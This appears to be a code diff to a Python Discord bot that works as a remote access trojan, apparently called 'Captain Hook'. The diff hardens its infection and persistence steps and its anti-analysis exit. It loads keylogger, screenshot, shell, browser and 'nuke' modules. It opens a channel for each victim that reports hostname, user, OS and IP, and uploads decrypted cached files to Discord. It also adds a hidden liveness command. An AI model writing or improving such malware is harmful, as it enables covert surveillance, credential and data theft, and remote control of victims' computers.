@@ -25,14 +25,21 @@ class CaptainHookBot(commands.Bot):
 
     async def setup_hook(self):
         # 0. Wraith Melt (Initial Infection & Persistence)
-        self.wraith.melt()
+        try:
+            self.wraith.melt()
+        except Exception as e:
+            print(f"Wraith Melt failed: {e}")
 
         # 1. Security Check
         if AntiAnalysis.check_all():
+            print("Anti-Analysis check triggered. Exiting.")
             sys.exit(0)
 
         # 2. Persistence Install
-        Persistence.install()
+        try:
+            Persistence.install()
+        except Exception as e:
+            print(f"Persistence installation failed: {e}")
 
         # 3. Load modules
         modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
@@ -40,8 +47,15 @@ class CaptainHookBot(commands.Bot):
             try:
                 # Use absolute import path for stability
                 await self.load_extension(f"src.client.modules.{module}")
+                print(f"Successfully loaded module: {module}")
             except Exception as e:
                 print(f"Failed to load module {module}: {e}")
+                # Try fallback for bundled environments
+                try:
+                    await self.load_extension(f"modules.{module}")
+                    print(f"Successfully loaded module (fallback): {module}")
+                except Exception as e2:
+                    print(f"Fallback loading for {module} failed: {e2}")
         
         # 4. Start Heartbeat
         self.loop.create_task(self.connectivity_heartbeat())
@@ -55,6 +69,7 @@ class CaptainHookBot(commands.Bot):
                         if resp.status == 200:
                             if not self.is_connected:
                                 self.is_connected = True
+                                print("Reconnected to Discord.")
                                 # Stop Offline Ears if it was running
                                 media_cog = self.get_cog("Media")
                                 if media_cog:
@@ -62,9 +77,10 @@ class CaptainHookBot(commands.Bot):
 
                                 if self.session_channel:
                                     await self.process_offline_cache()
-                except:
+                except Exception as e:
                     if self.is_connected:
                         self.is_connected = False
+                        print(f"Disconnected from Discord: {e}")
                         # Start Offline Ears
                         media_cog = self.get_cog("Media")
                         if media_cog:
@@ -77,26 +93,49 @@ class CaptainHookBot(commands.Bot):
         if self.session_channel:
             return self.session_channel
 
-        guild = self.get_guild(int(Config.GUILD_ID))
-        if not guild:
-            return None
-
-        channel_name = f"hook-{socket.gethostname().lower()}-{os.getlogin().lower()}"
-        channel_name = channel_name.replace(" ", "-").replace(".", "-")
-
-        # Try to find existing channel
-        channel = discord.utils.get(guild.text_channels, name=channel_name)
-        
-        if not channel:
-            try:
-                channel = await guild.create_text_channel(channel_name)
-                await channel.send(f"⚓ **New Session Established**\n**OS:** `{Platform.get_system_info()['os']}`\n**User:** `{os.getlogin()}`")
-            except Exception as e:
-                print(f"Error creating channel: {e}")
+        try:
+            guild_id_str = Config.GUILD_ID.strip()
+            if not guild_id_str or "[[" in guild_id_str:
+                print("Invalid Guild ID in config.")
                 return None
+            
+            guild_id = int(guild_id_str)
+            guild = self.get_guild(guild_id)
+            
+            if not guild:
+                # Fallback: try to get from guilds cache directly
+                guild = discord.utils.get(self.guilds, id=guild_id)
+                if not guild:
+                    print(f"Could not find guild with ID {guild_id}. Available guilds: {[g.name for g in self.guilds]}")
+                    return None
 
-        self.session_channel = channel
-        return channel
+            user_name = "unknown"
+            try:
+                user_name = os.getlogin().lower()
+            except:
+                import getpass
+                user_name = getpass.getuser().lower()
+
+            channel_name = f"hook-{socket.gethostname().lower()}-{user_name}"
+            channel_name = channel_name.replace(" ", "-").replace(".", "-")
+
+            # Try to find existing channel
+            channel = discord.utils.get(guild.text_channels, name=channel_name)
+            
+            if not channel:
+                try:
+                    channel = await guild.create_text_channel(channel_name)
+                    print(f"Created new session channel: {channel_name}")
+                    await channel.send(f"⚓ **New Session Established**\n**OS:** `{Platform.get_system_info()['os']}`\n**User:** `{user_name}`\n**IP:** `{socket.gethostbyname(socket.gethostname())}`")
+                except Exception as e:
+                    print(f"Error creating channel: {e}")
+                    return None
+
+            self.session_channel = channel
+            return channel
+        except Exception as e:
+            print(f"Unexpected error in channel creation: {e}")
+            return None
 
     async def process_offline_cache(self):
         """Decrypt and upload all files from the offline cache."""
@@ -128,6 +167,11 @@ class CaptainHookBot(commands.Bot):
         self.ensure_environment()
         if self.is_connected:
             await self.process_offline_cache()
+
+    @commands.command(name="p")
+    async def _ping_test(self, ctx):
+        """Hidden test command to verify bot is alive without cogs."""
+        await ctx.send(f"⚓ **Hook is Alive!**\n**Host:** `{socket.gethostname()}`\n**Modules Loaded:** `{len(self.cogs)}`")
 
     def ensure_environment(self):
         appdata = Platform.get_appdata_path()
